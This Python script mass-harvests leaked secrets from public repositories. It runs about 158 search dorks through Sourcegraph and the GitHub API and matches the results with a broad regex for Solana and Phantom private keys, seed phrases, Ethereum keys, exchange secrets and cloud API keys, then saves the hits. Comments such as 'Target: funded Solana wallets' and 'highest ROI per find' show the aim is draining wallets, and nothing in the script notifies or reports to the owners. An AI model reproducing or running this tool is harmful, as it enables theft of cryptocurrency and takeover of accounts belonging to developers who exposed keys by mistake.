#!/usr/bin/env python3
import requests, json, time, re, os, sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

TOKEN = os.environ.get('GH_TOKEN', '')
if not TOKEN:
    print('ERROR: GH_TOKEN not set', flush=True)
    sys.exit(1)
print('Token loaded.', flush=True)

HEADERS = {
    'Authorization': f'token {TOKEN}',
    'Accept': 'application/vnd.github.v3.text-match+json',  # inline match snippets, no raw fetch needed
}

# ── Sourcegraph streaming search ─────────────────────────────────────────────
# Primary search engine: no GitHub rate limits, inline content (no raw fetch needed)
SG_STREAM = 'https://sourcegraph.com/.api/search/stream'
SG_HEADERS = {'Accept': 'text/event-stream', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0'}

def _gh_dork_to_sg(dork):
    """Convert GitHub dork syntax to Sourcegraph query."""
    lang_map = {
        'ts': 'TypeScript', 'js': 'JavaScript', 'py': 'Python',
        'json': 'JSON', 'yml': 'YAML', 'yaml': 'YAML', 'sh': 'Bash',
        'toml': 'TOML', 'ipynb': 'Jupyter Notebook',
    }
    if dork.startswith('filename:'):
        rest = dork[9:]
        # 'filename:X Y Z' -> file:X Y Z
        parts = rest.split(' ', 1)
        fname = parts[0]
        terms = parts[1] if len(parts) > 1 else ''
        # wildcards: *.yml -> file:\.yml$
        if fname.startswith('*'):
            ext = fname.lstrip('*.')
            fname_re = r'\.' + ext + r'$'
        else:
            fname_re = re.escape(fname)
        return f'file:{fname_re} {terms}'.strip()
    elif dork.startswith('extension:'):
        rest = dork[10:]
        parts = rest.split(' ', 1)
        ext = parts[0]
        terms = parts[1] if len(parts) > 1 else ''
        lang = lang_map.get(ext, '')
        if lang:
            return f'lang:{lang} {terms}'.strip()
        return fr'file:\.{ext}$ {terms}'.strip()
    return dork

def search_sourcegraph(dork, count=500):
    """
    Query Sourcegraph streaming API. Returns list of (repo, path, line) tuples.
    Inline line content means no raw file fetch needed for most patterns.
    """
    sg_q = _gh_dork_to_sg(dork)
    params = {
        'q': f'context:global {sg_q} patternType:standard',
        'v': 'V3',
        'count': str(count),
    }
    results = []
    try:
        r = requests.get(SG_STREAM, headers=SG_HEADERS, params=params,
                         timeout=40, stream=True)
        for raw in r.iter_lines(decode_unicode=True):
            if not raw or not raw.startswith('data:'):
                continue
            ds = raw[5:].strip()
            if not ds or ds == '{}':
                continue
            try:
                d = json.loads(ds)
            except Exception:
                continue
            if isinstance(d, list):
                for item in d:
                    if not isinstance(item, dict) or item.get('type') != 'content':
                        continue
                    repo = item.get('repository', '').replace('github.com/', '', 1)
                    path = item.get('path', '')
                    for lm in item.get('lineMatches', []):
                        results.append((repo, path, lm.get('line', '')))
            elif isinstance(d, dict) and d.get('done'):
                break
    except Exception as e:
        print(f'  SG_err: {e}', flush=True)
    return results
# ─────────────────────────────────────────────────────────────────────────────

KEY_RE = re.compile(
    r'(sk_live_[a-zA-Z0-9]{24,}'
    r'|rk_live_[a-zA-Z0-9]{24,}'
    r'|AIza[0-9A-Za-z\-_]{35}'
    r'|AKIA[0-9A-Z]{16}'
    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
    r'|[0-9]{8,10}:[A-Za-z0-9_\-]{35}'
    # Exchange secrets
    r'|(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|binance_secret)\s*[=:"\s]+([A-Za-z0-9]{40,})'
    r'|(?:BYBIT_API_SECRET|bybit_secret)\s*[=:"\s]+([A-Za-z0-9]{36,})'
    r'|(?:OKX_SECRET_KEY|okx_secret|OKX_API_SECRET)\s*[=:"\s]+([A-Za-z0-9\-]{30,})'
    r'|(?:KUCOIN_API_SECRET|kucoin_secret)\s*[=:"\s]+([a-f0-9\-]{30,})'
    r'|(?:MEXC_SECRET_KEY|mexc_secret)\s*[=:"\s]+([A-Za-z0-9]{30,})'
    # Solana — base58 full keypair (64 bytes = 87-88 chars, base58 charset has no 0/O/I/l)
    r'|(?:SOLANA_PRIVATE_KEY|SOL_PRIVATE_KEY|ANCHOR_WALLET|DEPLOYER_PRIVATE_KEY|PAYER_PRIVATE_KEY'
    r'|OPERATOR_KEY|WALLET_KEYPAIR|SOL_KEYPAIR|SOLANA_KEYPAIR|PRIVATE_KEY_BASE58'
    r'|SOLANA_WALLET|PUMP_WALLET|SNIPER_WALLET|BOT_WALLET'
    r'|PHANTOM_PRIVATE_KEY|PHANTOM_WALLET|PHANTOM_KEY|PHANTOM_SEED_KEY'
    r'|MY_WALLET|WALLET_KEY|TRADER_WALLET|BUYER_WALLET|SELLER_WALLET'
    r'|COPY_WALLET|VOLUME_WALLET|BUNDLER_WALLET|JITO_WALLET|FEE_WALLET'
    r'|MAIN_WALLET|HOT_WALLET|FUNDING_WALLET|TRADE_WALLET|SIGNER_WALLET'
    r'|WALLET_PRIVATE_KEY|PRIVATE_KEY_WALLET|KEY_WALLET)\s*[=:"\':\s]+([1-9A-HJ-NP-Za-km-z]{87,88})'
    # Solana CLI keypair JSON array — [byte,byte,...x64] — the Solana CLI default format
    r'|"(?:secretKey|privateKey)"\s*:\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]'
    r'|(?:KEYPAIR|WALLET_BYTES)\s*=\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]'
    # Solana TypeScript bot pattern: Keypair.fromSecretKey(Buffer.from([...64...]))
    r'|Keypair\.fromSecretKey\s*\(\s*(?:Buffer\.from|Uint8Array\.from)?\s*\(\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]'
    # Solana bs58.decode pattern: Keypair.fromSecretKey(bs58.decode("...87chars..."))
    r'|bs58\.decode\s*\(\s*["\']([1-9A-HJ-NP-Za-km-z]{87,88})["\']\s*\)'
    # EVM private key — 32 bytes hex (Hardhat/Foundry deployer, MEV bots)
    r'|(?:PRIVATE_KEY|DEPLOYER_KEY|ETH_PRIVATE_KEY|WALLET_PRIVATE_KEY'
    r'|DEPLOYER_PRIVATE_KEY|MEV_BOT_KEY|SEARCHER_KEY|FLASHBOT_KEY)\s*[=:"\s]+(0x[a-fA-F0-9]{64})'
    # ethers.js / web3.py direct instantiation with hardcoded key
    r'|new ethers\.Wallet\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?'
    r'|from_key\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?'
    r'|privateKeyToAccount\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?'
    # Raw 32-byte hex private key without 0x prefix (common in older configs)
    r'|(?:PRIVATE_KEY|ETH_KEY)\s*[=:"\']+([a-fA-F0-9]{64})\b'
    # AWS
    r'|(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:"\s]+([A-Za-z0-9/+]{40})'
    # BIP39 mnemonic — 12 or 24 words from the wordlist
    r'|(?:MNEMONIC|mnemonic|SEED_PHRASE|WALLET_MNEMONIC|RECOVERY_PHRASE)\s*[=:"]+\s*'
    r'([a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z][a-z ]*)'
    # Stripe / Telegram / OpenAI
    r'|(?:STRIPE_SECRET_KEY|STRIPE_LIVE_SECRET)\s*[=:"\s]+(sk_live_[A-Za-z0-9]{24,})'
    r'|(?:OPENAI_API_KEY)\s*[=:"\s]+(sk-[A-Za-z0-9]{32,})'
    r'|(?:TELEGRAM_BOT_TOKEN|BOT_TOKEN)\s*[=:"\s]+([0-9]{8,10}:[A-Za-z0-9_\-]{35})'
    r'|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----)',
    re.IGNORECASE
)

DORKS = [
    # ══════════════════════════════════════════════════════════════
    # PHANTOM / SOLANA ONLY — stripped of all exchange/EVM/AWS noise
    # Target: funded Solana wallets committed to GitHub by bot devs
    # ══════════════════════════════════════════════════════════════

    # === PHANTOM WALLET DIRECT — Solana base58 keypair export ===
    'filename:.env PHANTOM_PRIVATE_KEY',
    'filename:.env PHANTOM_WALLET',
    'filename:.env PHANTOM_KEY',
    'filename:.env PHANTOM',
    'filename:phantom.txt',
    'filename:phantom_wallet.txt',
    'filename:phantom_key.txt',
    'filename:phantom.json secretKey',
    'filename:phantom-wallet.json',
    'filename:phantom_seed.txt',
    'filename:phantom_mnemonic.txt',
    'extension:ts PHANTOM_PRIVATE_KEY',
    'extension:js PHANTOM_PRIVATE_KEY',
    'extension:py PHANTOM_PRIVATE_KEY',
    'extension:ts PHANTOM_WALLET',
    'extension:js PHANTOM_WALLET',
    'filename:README.md PHANTOM_PRIVATE_KEY',

    # === SOLANA — funded keypairs (highest ROI per find) ===
    # .env patterns — devs building bots commit these constantly
    'filename:.env SOLANA_PRIVATE_KEY',
    'filename:.env SOL_PRIVATE_KEY',
    'filename:.env ANCHOR_WALLET',
    'filename:.env DEPLOYER_PRIVATE_KEY solana',
    'filename:.env PAYER_PRIVATE_KEY',
    'filename:.env WALLET_KEYPAIR',
    'filename:.env SOLANA_KEYPAIR',
    'filename:.env PUMP_WALLET',
    'filename:.env SNIPER_WALLET',
    'filename:.env BOT_WALLET solana',
    'filename:.env OPERATOR_KEY solana',
    # Solana CLI keypair JSON files — id.json / keypair.json contain raw uint8 arrays
    # These are the most common accidental commits
    'filename:id.json secretKey',
    'filename:keypair.json secretKey',
    'filename:wallet.json secretKey',
    'filename:deployer.json secretKey',
    'filename:payer.json secretKey',
    # pump.fun / sniper bots — ALWAYS have funded wallets
    'filename:.env PUMP_FUN PRIVATE_KEY',
    'filename:.env pump WALLET',
    'filename:sniper.ts PRIVATE_KEY',
    'filename:sniper.js PRIVATE_KEY',
    'filename:bot.ts SOLANA PRIVATE_KEY',
    'filename:.env JITO PRIVATE_KEY',
    'filename:.env SOLANA_WALLET PRIVATE_KEY',
    # Anchor/Solana program deployers
    'filename:.env.local SOLANA_PRIVATE_KEY',
    'filename:.env.local ANCHOR_WALLET',
    'filename:Anchor.toml wallet',

    # === BIP39 MNEMONICS — Solana/Phantom seed phrases ===
    'filename:.env MNEMONIC',
    'filename:.env SEED_PHRASE',
    'filename:.env WALLET_MNEMONIC',
    'filename:config.json mnemonic',
    'filename:.env RECOVERY_PHRASE',
    # 12-word mnemonics in trading bot configs
    'filename:config.js mnemonic abandon',
    'filename:.env SECRET_RECOVERY_PHRASE',

    # === REAL MNEMONIC FILES — plaintext backup files, NOT .env.example ===
    # Devs save seed phrases to text files and commit them
    'filename:seed.txt mnemonic',
    'filename:wallet.txt mnemonic',
    'filename:backup.txt mnemonic',
    'filename:keys.txt mnemonic',
    'filename:phrase.txt',
    'filename:recovery.txt',
    'filename:seed_phrase.txt',
    'filename:.env.production MNEMONIC',
    'filename:.env.prod MNEMONIC',
    'filename:.env.prod SEED_PHRASE',
    # Solana wallet files people commit accidentally
    'filename:wallet.json solana mnemonic',
    # Config files (not example)
    'filename:config.yaml mnemonic',
    'filename:config.yml MNEMONIC',
    'filename:settings.py MNEMONIC',
    'filename:.env TRON_MNEMONIC',
    'filename:.env BTC_MNEMONIC',
    # Jupyter notebooks with real mnemonics
    'extension:ipynb SEED_PHRASE',
    'extension:ipynb RECOVERY_PHRASE',
    # === BROAD TXT MNEMONIC SWEEP — catches address.txt, wallet.txt, any plaintext ===
    # kulvinder05/address.env.txt pattern: devs saving seed to any .txt file
    'extension:txt SEED_PHRASE',
    'extension:txt MNEMONIC',
    'extension:txt SECRET_RECOVERY_PHRASE',
    'extension:txt WALLET_MNEMONIC',
    # address files — devs saving wallet setup to address files
    'filename:address.txt',
    'filename:address.env',
    'filename:wallet.env',
    'filename:crypto.env',
    # Hardcoded mnemonics in Python/JS bot scripts (not .env)
    'extension:py SEED_PHRASE =',
    'extension:py MNEMONIC =',
    'extension:js SEED_PHRASE =',
    'extension:ts SEED_PHRASE =',
    # README and docs people accidentally paste real keys into
    'filename:README.md SEED_PHRASE',
    'filename:SETUP.md mnemonic',

    # === JUPYTER NOTEBOOKS — Solana devs test with real keypairs ===
    'extension:ipynb secretKey solana',
    'extension:ipynb Keypair fromSecretKey',
    'extension:ipynb MNEMONIC',
    'extension:ipynb SEED_PHRASE',

    # === SOLANA CODE PATTERNS — direct key hardcoding in TS/JS bots ===
    # Keypair.fromSecretKey is how every Solana bot initializes its wallet
    'extension:ts Keypair.fromSecretKey Buffer.from',
    'extension:js Keypair.fromSecretKey Buffer.from',
    'extension:ts Keypair.fromSecretKey bs58.decode',
    'extension:js Keypair.fromSecretKey bs58.decode',
    'extension:ts fromSecretKey Uint8Array',
    'extension:js fromSecretKey Uint8Array',
    # Solana web3.js direct array instantiation
    'extension:ts secretKey solana pump',
    'extension:js secretKey solana pump',
    # Anchor workspace wallet
    'extension:ts anchor.Wallet keypair',
    'extension:ts loadKeypair private',

    # === DOCKER / CI — Solana bots in compose ===
    'filename:docker-compose.yml SOLANA',
    'filename:docker-compose.yml PRIVATE_KEY',

    # === PYTHON SOLANA SCRIPTS ===
    'extension:py solana keypair secret',

    # === ADDITIONAL SOLANA BOT PATTERNS ===
    'filename:.env RAYDIUM PRIVATE_KEY',
    'filename:.env JUPITER PRIVATE_KEY',
    'filename:.env DRIFT PRIVATE_KEY',
    'filename:.env MARGINFI PRIVATE_KEY',
    'filename:.env ORCA PRIVATE_KEY',
    # volume bots / market making
    'filename:.env VOLUME_BOT PRIVATE_KEY',
    'filename:.env MARKET_MAKER solana',
    'filename:.env COPY_TRADE PRIVATE_KEY',
    'filename:.env ARBITRAGE solana PRIVATE_KEY',

    # === SHELL SCRIPTS — Solana devs export keys in dotfiles ===
    'filename:.bashrc SOLANA',
    'filename:.zshrc SOLANA_PRIVATE_KEY',
    'extension:sh export SOLANA_PRIVATE_KEY',

    # === PUMP.FUN / BUNDLE / LAUNCH BOT PATTERNS (2024-2025) ===
    'filename:.env BUNDLE_WALLET PRIVATE_KEY',
    'filename:.env LAUNCH_WALLET',
    'filename:.env DEV_WALLET solana',
    'filename:.env CREATOR_WALLET',
    'filename:.env PUMP_PRIVATE_KEY',
    'filename:bundle.ts PRIVATE_KEY',
    'filename:launch.ts PRIVATE_KEY',
    'filename:createToken.ts PRIVATE_KEY',
    'filename:buyToken.ts PRIVATE_KEY',

    # === .env variants — devs forget SOLANA keys in staging/dev envs ===
    'filename:.env.development SOLANA',
    'filename:.env.dev SOLANA_PRIVATE_KEY',
    'filename:.env.local SOLANA_PRIVATE_KEY',

    # === CONFIG FILES ===
    'filename:config.toml private_key',

    # === FUNDED PHANTOM PATTERNS — pump.fun / trading bots using Phantom export ===
    # Devs use "MY_WALLET", "MAIN_WALLET" etc with their Phantom export key
    'filename:.env MY_WALLET',
    'filename:.env MAIN_WALLET solana',
    'filename:.env HOT_WALLET',
    'filename:.env TRADER_WALLET',
    'filename:.env BUYER_WALLET',
    'filename:.env TRADE_WALLET',
    'filename:.env FUNDING_WALLET',
    'filename:.env SIGNER_WALLET',
    'filename:.env FEE_PAYER_KEY',
    'filename:.env FEE_WALLET',
    'filename:.env VOLUME_WALLET',
    'filename:.env JITO_WALLET',
    # === BROWSER EXTENSION WALLETS exported to files ===
    'filename:metamask_export.json mnemonic',
    'filename:wallet_export.json mnemonic',
    'filename:keystore password',

    # === NFT MARKETPLACE BOTS (2023-2024) ===
    'filename:.env OPENSEA_API_KEY PRIVATE_KEY',
    'filename:.env BLUR_API_KEY PRIVATE_KEY',
    'filename:nft_bot.py PRIVATE_KEY',
    'filename:mint.ts PRIVATE_KEY mainnet',

    # === CROSS-CHAIN BRIDGE / ARBITRAGE BOTS ===
    'filename:.env CROSS_CHAIN_PRIVATE_KEY',
    'filename:.env BRIDGE_BOT PRIVATE_KEY',
    'filename:.env CHAIN_A_PRIVATE_KEY',
    'filename:.env CHAIN_B_PRIVATE_KEY',
    'filename:arb.ts PRIVATE_KEY rpc',
]

# load seen set
seen = set()
if os.path.exists('seen.txt'):
    for line in open('seen.txt'):
        seen.add(line.strip())
print(f'Seen: {len(seen)} already scanned', flush=True)

def search(query, page=1):
    url = 'https://api.github.com/search/code'
    params = {'q': query, 'per_page': 100, 'page': page}
    r = requests.get(url, headers=HEADERS, params=params, timeout=15)
    if r.status_code == 403:
        reset = int(r.headers.get('X-RateLimit-Reset', time.time() + 60))
        wait = max(reset - time.time(), 5)
        print(f'  rate limit — sleeping {wait:.0f}s', flush=True)
        time.sleep(wait)
        return None
    if r.status_code != 200:
        print(f'  error {r.status_code}: {r.text[:100]}', flush=True)
        return None
    return r.json()

def get_raw(url):
    raw = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    r = requests.get(raw, headers=HEADERS, timeout=10)
    return r.text[:8000] if r.status_code == 200 else ''

def scan_item(item):
    """Extract secrets from a GitHub search result item.
    Uses inline text_matches first (no HTTP needed), falls back to raw fetch only if needed."""
    html_url = item.get('html_url', '')
    repo = item.get('repository', {}).get('full_name', '')
    path = item.get('path', '')

    # text_matches comes free with Accept: text-match header — no raw fetch needed
    fragments = ' '.join(
        tm.get('fragment', '')
        for tm in item.get('text_matches', [])
    )
    secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(fragments))) if fragments else []

    # only fetch raw if text_matches returned something but regex needs more context
    if not secrets and not fragments:
        try:
            content = get_raw(html_url)
        except Exception:
            content = ''
        if content:
            secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(content)))

    return html_url, repo, path, secrets

def fetch_and_scan(item):
    return scan_item(item)

findings = []
new_seen = []
_last_gh_call = 0

def _gh_search_paced(dork, page):
    global _last_gh_call
    gap = time.time() - _last_gh_call
    if gap < 2.0:
        time.sleep(2.0 - gap)
    result = search(dork, page)
    _last_gh_call = time.time()
    return result

# ══ Phase 1: Sourcegraph — run ALL dorks in parallel ═══════════════════════
# 8 concurrent SG queries × ~15s each = ~5 min for all 158 dorks
# (vs sequential GitHub API: 158 × 2s pacing + waits = 52+ min)
print(f'\n=== Phase 1: Sourcegraph parallel scan ({len(DORKS)} dorks, 16 workers) ===', flush=True)
t_sg_start = time.time()
sg_results_map = {}

with ThreadPoolExecutor(max_workers=16) as ex:
    future_to_dork = {ex.submit(search_sourcegraph, dork, 500): dork for dork in DORKS}
    done_count = 0
    for future in as_completed(future_to_dork):
        dork = future_to_dork[future]
        try:
            sg_results_map[dork] = future.result()
        except Exception as e:
            sg_results_map[dork] = []
            print(f'  SG_ERR {dork[:40]}: {e}', flush=True)
        done_count += 1
        if done_count % 10 == 0:
            print(f'  SG progress: {done_count}/{len(DORKS)} ({time.time()-t_sg_start:.0f}s)', flush=True)

print(f'SG phase complete in {time.time()-t_sg_start:.0f}s', flush=True)

# ══ Phase 2: Process SG results + collect raw-fetch queue ══════════════════
gh_fallback_dorks = []
all_raw_needed = []

for dork in DORKS:
    sg_lines = sg_results_map.get(dork, [])
    sg_new = 0

    for repo, path, line in sg_lines:
        key = f'{repo}/{path}'
        if key in seen:
            continue
        seen.add(key)
        new_seen.append(key)
        sg_new += 1

        secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(line)))
        if secrets:
            findings.append({
                'url': f'https://github.com/{repo}/blob/HEAD/{path}',
                'repo': repo,
                'path': path,
                'secrets': secrets[:10],
                'found_at': datetime.utcnow().isoformat(),
                'source': 'sg',
            })
            print(f'  HIT(sg): {repo}/{path} — {len(secrets)} secrets', flush=True)
        else:
            # keyword matched but key on adjacent line — queue raw fetch (capped per dork)
            if sg_new <= 30:
                all_raw_needed.append({
                    'html_url': f'https://github.com/{repo}/blob/HEAD/{path}',
                    'repository': {'full_name': repo},
                    'path': path,
                })

    # only fall back to GH API if SG found zero candidates for this dork
    if sg_new == 0:
        gh_fallback_dorks.append(dork)

# parallel raw fetch for all queued items at once
if all_raw_needed:
    print(f'\n=== Phase 2b: Raw fetch for {len(all_raw_needed)} SG candidates ===', flush=True)
    with ThreadPoolExecutor(max_workers=16) as ex:
        futures = {ex.submit(fetch_and_scan, item): item for item in all_raw_needed}
        for future in as_completed(futures):
            try:
                html_url, repo, path, secrets = future.result()
            except Exception:
                continue
            if secrets:
                findings.append({
                    'url': html_url,
                    'repo': repo,
                    'path': path,
                    'secrets': secrets[:10],
                    'found_at': datetime.utcnow().isoformat(),
                    'source': 'sg_raw',
                })
                print(f'  HIT(sg_raw): {repo}/{path} — {len(secrets)} secrets', flush=True)

# ══ Phase 3: GitHub API fallback for low-coverage dorks ═══════════════════
print(f'\n=== Phase 3: GitHub API fallback ({len(gh_fallback_dorks)} dorks) ===', flush=True)
for dork in gh_fallback_dorks:
    print(f'\nGH: {dork}', flush=True)
    for page in range(1, 11):
        result = _gh_search_paced(dork, page)
        if not result:
            break
        items = result.get('items', [])
        total = result.get('total_count', 0)
        if page == 1:
            print(f'  {total} total', flush=True)
        if not items:
            break

        new_items_list = []
        for item in items:
            repo = item.get('repository', {}).get('full_name', '')
            path = item.get('path', '')
            key = f'{repo}/{path}'
            if key not in seen:
                seen.add(key)
                new_seen.append(key)
                new_items_list.append(item)

        print(f'  page {page}: {len(new_items_list)} new', flush=True)

        with ThreadPoolExecutor(max_workers=8) as ex:
            futures = {ex.submit(fetch_and_scan, item): item for item in new_items_list}
            for future in as_completed(futures):
                try:
                    html_url, repo, path, secrets = future.result()
                except Exception:
                    continue
                if secrets:
                    findings.append({
                        'url': html_url,
                        'repo': repo,
                        'path': path,
                        'secrets': secrets[:10],
                        'found_at': datetime.utcnow().isoformat(),
                        'source': 'gh',
                    })
                    print(f'  HIT(gh): {repo}/{path} — {len(secrets)} secrets', flush=True)

        if len(items) < 100:
            break

print(f'\nTotal hits: {len(findings)}', flush=True)
print(f'New candidates scanned: {len(new_seen)}', flush=True)

with open('gh_findings.jsonl', 'w') as f:
    for r in findings:
        f.write(json.dumps(r) + '\n')

with open('seen.txt', 'a') as f:
    for key in new_seen:
        f.write(key + '\n')

print('Written to gh_findings.jsonl')
